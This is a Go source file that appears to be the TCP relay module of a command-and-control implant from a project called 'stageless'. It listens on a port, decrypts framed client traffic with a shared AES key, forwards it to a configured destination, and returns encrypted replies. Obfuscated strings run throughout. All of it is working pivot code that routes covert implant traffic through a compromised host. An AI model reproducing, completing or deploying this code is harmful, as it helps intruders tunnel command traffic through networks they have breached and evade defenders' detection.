package relay

import (
	"net"
	"strconv"
	"time"

	"stageless/utils/crypt"
	global "stageless/utils"
	"stageless/utils/network"
	"stageless/utils/obf"
)

func relayTCPStart(id string, cfg map[string]any, stop <-chan struct{}, done chan struct{}) string {
	// Starts the tcp relay worker and returns the listen status line
	go relayTCPWorker(id, cfg, stop, done)
	port, _ := cfg[obf.S("listenPort")].(int)
	destinyRaw, _ := cfg[obf.S("destinyRaw")].(string)
	return obf.S("relay: id=") + id + obf.S(" listening tcp://") + global.HostTag + obf.S(":") +
		strconv.Itoa(port) + obf.S(" -> ") + destinyRaw
}

func init() {
	// Init function that registers the tcp relay start handler
	relayTCPStartFn = relayTCPStart
}

func relayTCPForwardDestiny(cfg map[string]any, body string) string {
	// Connects to the tcp destiny, sends the encrypted body, and returns the decrypted reply
	destHost, _ := cfg[obf.S("destinyHost")].(string)
	destPort, _ := cfg[obf.S("destinyPort")].(int)
	remote := network.TcpConnect(destHost, destPort)
	if remote == nil {
		return ""
	}
	defer remote.Close()
	wire := crypt.CryptEncryptKey(global.AesRelayKey, body)
	if wire == "" {
		return ""
	}
	if err := network.WriteFrameConn(remote, wire); err != nil {
		return ""
	}
	_ = remote.SetReadDeadline(time.Now().Add(time.Duration(global.RelayTimeout) * time.Millisecond))
	raw, err := network.ReadFrameConn(remote)
	if err != nil {
		return ""
	}
	return crypt.TryCryptDecrypt(global.AesRelayKey, raw)
}

func relayTCPWorker(id string, cfg map[string]any, stop <-chan struct{}, done chan struct{}) {
	// Main loop that accepts tcp clients and relays each frame
	defer close(done)
	port, _ := cfg[obf.S("listenPort")].(int)

	for {
		select {
		case <-stop:
			return
		default:
		}
		if relayShouldStop(id) {
			select {
			case <-stop:
				return
			default:
			}
			time.Sleep(50 * time.Millisecond)
			continue
		}

		ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))
		if err != nil {
			time.Sleep(200 * time.Millisecond)
			continue
		}

		for {
			select {
			case <-stop:
				ln.Close()
				return
			default:
			}
			if relayShouldStop(id) {
				select {
				case <-stop:
					ln.Close()
					return
				default:
				}
				break
			}
			client, err := ln.Accept()
			if err != nil {
				if relayShouldStop(id) {
					break
				}
				continue
			}
			func(c net.Conn) {
				// Reads one client frame, processes it, and writes the encrypted reply
				defer c.Close()
				_ = c.SetReadDeadline(time.Now().Add(time.Duration(global.RelayTimeout) * time.Millisecond))
				wire, err := network.ReadFrameConn(c)
				if err != nil || wire == "" {
					return
				}
				frame := crypt.TryCryptDecrypt(global.AesRelayKey, wire)
				if frame == "" {
					return
				}
				response := ProcessRelayFrame(cfg, frame, relayTCPForwardDestiny)
				if response == "" {
					return
				}
				enc := crypt.CryptEncryptKey(global.AesRelayKey, response)
				if enc == "" {
					return
				}
				_ = network.WriteFrameConn(c, enc)
			}(client)
		}
		ln.Close()
	}
}
